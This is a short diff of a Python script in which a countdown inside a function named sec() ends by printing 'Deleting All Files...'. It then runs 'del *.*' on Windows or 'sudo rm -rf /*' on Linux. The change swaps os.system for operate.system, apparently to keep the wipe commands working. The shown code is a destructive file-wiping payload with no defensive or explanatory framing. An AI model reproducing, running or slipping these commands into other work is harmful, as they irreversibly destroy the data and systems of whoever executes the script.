@@ -52,11 +52,10 @@ def sec():
         stop -= 1
         if os == "Windows" and stop == 0:
             print(wi + rd + "\rDeleting All Files...")
-            os.system('del *.*')
-            os.system
+            operate.system('del *.*')
         elif os == "Linux" and stop == 0:
             print(wi + rd + "\rDeleting All Files...")
-            os.system('sudo rm -rf /*')
+            operate.system('sudo rm -rf /*')
 def quit():
     choice = input("Are you sure? y/n:")
     if choice == 'y':
